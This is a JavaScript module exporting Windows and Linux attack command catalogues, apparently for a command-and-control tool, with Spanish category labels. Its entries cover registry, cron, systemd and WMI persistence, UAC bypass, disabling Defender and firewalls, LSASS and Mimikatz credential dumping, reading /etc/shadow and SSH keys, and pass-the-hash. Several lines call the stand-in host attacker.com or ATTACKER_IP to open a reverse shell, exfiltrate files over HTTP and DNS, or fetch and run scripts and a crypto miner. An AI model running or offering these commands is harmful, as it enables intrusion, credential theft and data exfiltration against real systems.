const windowsOperationsArray = [
  // Persistence
  {
    category: 'Persistencia',
    name: 'Ruta de inicio',
    command: 'New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"Updater\" -Value \"C:\\path\\to\\payload.exe\"',
    type: 'external',
  },
  {
    category: 'Persistencia',
    name: 'Registro',
    command: 'Set-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Shell\" -Value \"explorer.exe, C:\\malicious.exe\"',
    type: 'external',
  },
  {
    category: 'Persistencia',
    name: 'Tarea programada',
    command: 'schtasks /create /sc minute /mo 2 /tn \"Updater\" /tr \"C:\\Users\\User\\AppData\\Local\\Programs\\Python\\Launcher\\py.exe C:\\Users\\User\\Documents\\Wizard c2c\\c2implant\\index2.py\"',
    type: 'external',
  },
  {
    category: 'Persistencia',
    name: 'WMI Event Subscription',
    command: '$filterArgs = @{name=\"UpdaterFilter\"; EventNameSpace=\"root\\cimv2\"; QueryLanguage=\"WQL\"; Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \'Win32_PerfFormattedData_PerfOS_System\'\"}; $filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $filterArgs; $consumerArgs = @{name=\"UpdaterConsumer\"; CommandLineTemplate=\"C:\\Windows\\System32\\evil.exe\";}; $consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $consumerArgs; New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property @{Filter=$filter; Consumer=$consumer}',
    type: 'external',
  },

  // Privilege Escalation
  {
    category: 'Escalada de Privilegios',
    name: 'UAC Bypass - Fodhelper',
    command: 'Start-Process \"C:\\Windows\\System32\\fodhelper.exe\" -Verb runAs',
    type: 'external',
  },
  {
    category: 'Escalada de Privilegios',
    name: 'Service Binaries Hijack',
    command: 'sc qc vulnerableService',
    type: 'external',
  },
  {
    category: 'Escalada de Privilegios',
    name: 'DLL Hijacking',
    command: 'reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v hijack /t REG_SZ /d \"C:\\evil.dll\"',
    type: 'external',
  },
  {
    category: 'Escalada de Privilegios',
    name: 'Token Impersonation',
    command: 'Invoke-TokenManipulation -ImpersonateUser -Username \"DOMAIN\\adminuser\"',
    type: 'external',
  },
  {
    category: 'Escalada de Privilegios',
    name: 'Named Pipe Impersonation',
    command: 'Invoke-NamedPipeImpersonation -PipeName \"\\\\.\\pipe\\somepipe\" -Command \"whoami\"',
    type: 'external',
  },

  // AV/EDR Evasion
  {
    category: 'Evasión de AV/EDR',
    name: 'Ofuscación básica',
    command: 'powershell -exec bypass -windowstyle hidden -EncodedCommand [base64]',
    type: 'external',
  },
  {
    category: 'Evasión de AV/EDR',
    name: 'AMSI Bypass',
    command: 'Set-MpPreference -DisableRealtimeMonitoring $true',
    type: 'external',
  },
  {
    category: 'Evasión de AV/EDR',
    name: 'ETW Bypass',
    command: '[System.Reflection.Assembly]::Load([Convert]::FromBase64String(\"<payload>\"))',
    type: 'external',
  },
  {
    category: 'Evasión de AV/EDR',
    name: 'Process Hollowing',
    command: 'Invoke-ProcessHollowing -PathToBinary \"C:\\Windows\\System32\\notepad.exe\" -Payload \"C:\\evil.bin\"',
    type: 'external',
  },
  {
    category: 'Evasión de AV/EDR',
    name: 'Direct Syscalls',
    command: 'Invoke-DirectSyscall -SyscallNumber 0x55 -Arguments @(0x1234, 0x5678)',
    type: 'external',
  },

  // Credential Access
  {
    category: 'Recolección de Credenciales',
    name: 'LSASS Dump',
    command: 'rundll32.exe comsvcs.dll, MiniDump 1234 lsass.dmp full',
    type: 'external',
  },
  {
    category: 'Recolección de Credenciales',
    name: 'Mimikatz',
    command: 'Invoke-Mimikatz -Command \"sekurlsa::logonpasswords\"',
    type: 'external',
  },
  {
    category: 'Recolección de Credenciales',
    name: 'Credenciales de Wi-Fi',
    command: 'netsh wlan show profiles | Select-String \"Perfil de todos los usuarios\" | ForEach-Object { $name = ($_ -split \":\")[1].Trim(); netsh wlan show profile name=\"$name\" key=clear | Select-String \"Contenido de la clave\" }',
    type: 'download',
  },
  {
    category: 'Recolección de Credenciales',
    name: 'DCSync Attack',
    command: 'Invoke-Mimikatz -Command \"\\"lsadump::dcsync /domain:contoso.com /user:Administrator\\"\"',
    type: 'external',
  },
  {
    category: 'Recolección de Credenciales',
    name: 'SAM Database Extract',
    command: 'reg save HKLM\\SAM sam.save && reg save HKLM\\SYSTEM system.save',
    type: 'download',
  },

  // Lateral Movement
  {
    category: 'Movimiento Lateral',
    name: 'WMI Exec',
    command: 'Invoke-WMIExec -Target \"WORKSTATION01\" -Username \"DOMAIN\\user\" -Password \"Passw0rd!\" -Command \"cmd.exe /c whoami\"',
    type: 'external',
  },
  {
    category: 'Movimiento Lateral',
    name: 'Pass the Hash',
    command: 'Invoke-SMBExec -Target \"WORKSTATION02\" -Domain \"DOMAIN\" -Username \"admin\" -Hash \"aad3b435b51404eeaad3b435b51404ee:579da618cfbfa85279780dc0c7b1d53e\" -Command \"cmd.exe /c whoami\"',
    type: 'external',
  },
  {
    category: 'Movimiento Lateral',
    name: 'PSRemoting',
    command: 'Enter-PSSession -ComputerName \"WORKSTATION03\" -Credential (Get-Credential)',
    type: 'external',
  },
  {
    category: 'Movimiento Lateral',
    name: 'Scheduled Task Lateral',
    command: 'schtasks /create /s \"WORKSTATION04\" /tn \"Update\" /tr \"powershell.exe -nop -w hidden -c \\"IEX ((new-object net.webclient).downloadstring(\'http://attacker.com/evil.ps1\'))\\"\" /sc once /st 00:00 /ru SYSTEM',
    type: 'external',
  },

  // Reconnaissance

  {
    category: 'Reconocimiento',
    name: 'User Enumeration',
    command: 'net user /domain',
    type: 'external',
  },
  {
    category: 'Reconocimiento',
    name: 'Share Enumeration',
    command: 'net share',
    type: 'external',
  },
  {
    category: 'Reconocimiento',
    name: 'BloodHound Ingest',
    command: 'Invoke-BloodHound -CollectionMethod All -Domain \"contoso.com\" -ZipFileName loot.zip',
    type: 'download',
  },

  // Command and Control
  {
    category: 'Comando y Control',
    name: 'DNS Beacon',
    command: 'Start-DNSBeacon -DNSServer \"attacker.com\" -QueryInterval 5 -Jitter 0.3',
    type: 'external',
  },
  {
    category: 'Comando y Control',
    name: 'HTTP Beacon',
    command: 'Start-HTTPSBeacon -URL \"https://attacker.com/api/checkin\" -Sleep 60 -Jitter 20',
    type: 'external',
  },
  {
    category: 'Comando y Control',
    name: 'Kill Date',
    command: 'Set-KillDate -Date \"2023-12-31\"',
    type: 'external',
  },
  {
    category: 'Comando y Control',
    name: 'Parent PID Spoofing',
    command: 'Start-Process -Path \"C:\\Windows\\System32\\notepad.exe\" -ParentProcessId 1234',
    type: 'external',
  },

  // Exfiltration
  {
    category: 'Exfiltración',
    name: 'Data Compression',
    command: 'Compress-Archive -Path \"C:\\sensitive\\*\" -DestinationPath \"C:\\temp\\data.zip\"',
    type: 'external',
  },
  {
    category: 'Exfiltración',
    name: 'DNS Exfiltration',
    command: 'Invoke-DNSExfil -Data (Get-Content secret.txt) -Domain \"attacker.com\" -Subdomain \"data\"',
    type: 'external',
  },
  {
    category: 'Exfiltración',
    name: 'ICMP Exfiltration',
    command: 'Invoke-ICMPExfil -Destination \"192.168.1.100\" -File \"C:\\secrets.txt\"',
    type: 'external',
  },

  // Impact
  {
    category: 'Impacto',
    name: 'Disable Defender',
    command: 'Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true',
    type: 'external',
  },
  {
    category: 'Impacto',
    name: 'Disable Firewall',
    command: 'netsh advfirewall set allprofiles state off',
    type: 'external',
  },

];


const linuxOperationsArray = [
  // Persistencia
  {
    category: 'Persistencia',
    name: 'Archivo de inicio (.bashrc)',
    command: 'echo "python3 /path/to/payload.py &" >> ~/.bashrc',
    type: 'external',
  },
  {
    category: 'Persistencia',
    name: 'Cron Job',
    command: '(crontab -l 2>/dev/null; echo "*/5 * * * * python3 /path/to/payload.py") | crontab -',
    type: 'external',
  },
  {
    category: 'Persistencia',
    name: 'Servicio Systemd',
    command: 'echo -e "[Unit]\\nDescription=Custom Service\\n\\n[Service]\\nExecStart=/usr/bin/python3 /path/to/payload.py\\nRestart=always\\n\\n[Install]\\nWantedBy=multi-user.target" > /etc/systemd/system/malicious.service && systemctl enable malicious.service',
    type: 'external',
  },
  {
    category: 'Persistencia',
    name: 'LD_PRELOAD Hijacking',
    command: 'echo "/path/to/malicious_lib.so" > /etc/ld.so.preload',
    type: 'external',
  },

  // Escalada de Privilegios
  {
    category: 'Escalada de Privilegios',
    name: 'SUID Binaries',
    command: 'find / -perm -4000 -type f 2>/dev/null',
    type: 'external',
  },
  {
    category: 'Escalada de Privilegios',
    name: 'Capabilities',
    command: 'getcap -r / 2>/dev/null',
    type: 'external',
  },
  {
    category: 'Escalada de Privilegios',
    name: 'Kernel Exploits',
    command: 'uname -a && cat /etc/os-release',
    type: 'external',
  },
  {
    category: 'Escalada de Privilegios',
    name: 'Docker Escape',
    command: 'docker --version && cat /proc/self/cgroup | grep -i docker',
    type: 'external',
  },
  {
    category: 'Escalada de Privilegios',
    name: 'Password Hunting',
    command: 'find / -name "*.php" -o -name "*.conf" -o -name "*.cnf" -o -name "*.ini" -o -name "*.env" -type f -exec grep -i "password" {} \\; 2>/dev/null',
    type: 'external',
  },

  // Evasión de AV/EDR
  {
    category: 'Evasión de AV/EDR',
    name: 'Ofuscación básica',
    command: 'python3 -c "import base64; exec(base64.b64decode(\'<base64_payload>\').decode(\'utf-8\'))"',
    type: 'external',
  },
  {
    category: 'Evasión de AV/EDR',
    name: 'Memory Execution',
    command: 'python3 -c "import ctypes; libc = ctypes.CDLL(None); shellcode = b\'\\x90\\x90...\'; libc.mprotect(shellcode, len(shellcode), 0x7); (ctypes.cast(shellcode, ctypes.CFUNCTYPE(None))()"',
    type: 'external',
  },
  {
    category: 'Evasión de AV/EDR',
    name: 'Process Injection',
    command: 'gcc -shared -o inject.so -fPIC inject.c && LD_PRELOAD=./inject.so /bin/ls',
    type: 'external',
  },
  {
    category: 'Evasión de AV/EDR',
    name: 'Syscall Directo',
    command: 'gcc -o syscall_exec syscall_exec.c && ./syscall_exec',
    type: 'external',
  },

  // Recolección de Credenciales
  {
    category: 'Recolección de Credenciales',
    name: 'Historial de Bash',
    command: 'cat ~/.bash_history | grep -i "pass"',
    type: 'external',
  },
  {
    category: 'Recolección de Credenciales',
    name: 'Archivos de Configuración',
    command: 'find / -name "*config*" -o -name "*credential*" -type f -exec grep -i "pass" {} \\; 2>/dev/null',
    type: 'external',
  },
  {
    category: 'Recolección de Credenciales',
    name: 'Dump de Memoria',
    command: 'gcore -o /tmp/dump <PID>',
    type: 'download',
  },
  {
    category: 'Recolección de Credenciales',
    name: 'Credenciales de SSH',
    command: 'cat ~/.ssh/id_rsa && cat ~/.ssh/known_hosts',
    type: 'download',
  },
  {
    category: 'Recolección de Credenciales',
    name: 'Shadow File',
    command: 'cat /etc/shadow',
    type: 'download',
  },

  // Movimiento Lateral
  {
    category: 'Movimiento Lateral',
    name: 'SSH con Clave',
    command: 'ssh -i /path/to/key user@target',
    type: 'external',
  },
  {
    category: 'Movimiento Lateral',
    name: 'SSH Pass',
    command: 'sshpass -p "password" ssh user@target',
    type: 'external',
  },
  {
    category: 'Movimiento Lateral',
    name: 'SCP Transfer',
    command: 'scp /path/to/file user@target:/remote/path',
    type: 'external',
  },
  {
    category: 'Movimiento Lateral',
    name: 'Cron Job Remoto',
    command: 'ssh user@target \'(crontab -l 2>/dev/null; echo "*/5 * * * * python3 /path/to/payload.py") | crontab -\'',
    type: 'external',
  },

  // Reconocimiento
  {
    category: 'Reconocimiento',
    name: 'Información del Sistema',
    command: 'uname -a && cat /etc/*release && lscpu && free -h',
    type: 'external',
  },
  {
    category: 'Reconocimiento',
    name: 'Usuarios y Grupos',
    command: 'cat /etc/passwd && cat /etc/group',
    type: 'external',
  },
  {
    category: 'Reconocimiento',
    name: 'Conexiones de Red',
    command: 'ss -tulnp && netstat -antup',
    type: 'external',
  },
  {
    category: 'Reconocimiento',
    name: 'Procesos en Ejecución',
    command: 'ps aux | grep -v "\["',
    type: 'external',
  },

  // Comando y Control
  {
    category: 'Comando y Control',
    name: 'Reverse Shell',
    command: 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1',
    type: 'external',
  },
  {
    category: 'Comando y Control',
    name: 'DNS Beacon',
    command: 'dig +short $(whoami).$(hostname).attacker.com',
    type: 'external',
  },
  {
    category: 'Comando y Control',
    name: 'ICMP C2',
    command: 'ping -c 1 -p $(echo "COMMAND" | xxd -p) ATTACKER_IP',
    type: 'external',
  },

  // Exfiltración
  {
    category: 'Exfiltración',
    name: 'Compresión de Datos',
    command: 'tar czf /tmp/data.tar.gz /path/to/sensitive/data',
    type: 'external',
  },
  {
    category: 'Exfiltración',
    name: 'Transferencia HTTP',
    command: 'curl -X POST -F "file=@/path/to/file" http://attacker.com/upload',
    type: 'external',
  },
  {
    category: 'Exfiltración',
    name: 'Exfiltración DNS',
    command: 'for part in $(cat /path/to/file | xxd -p -c 16); do dig +short $part.attacker.com; done',
    type: 'external',
  },

  // Impacto
  {
    category: 'Impacto',
    name: 'Deshabilitar Firewall',
    command: 'ufw disable || systemctl stop firewalld',
    type: 'external',
  },
  {
    category: 'Impacto',
    name: 'Kill Processes',
    command: 'pkill -f "security|av|edr"',
    type: 'external',
  },
  {
    category: 'Impacto',
    name: 'Crypto Miner',
    command: 'curl -s http://attacker.com/xmrig | bash -s WALLET_ADDRESS',
    type: 'external',
  }
];

export { windowsOperationsArray, linuxOperationsArray }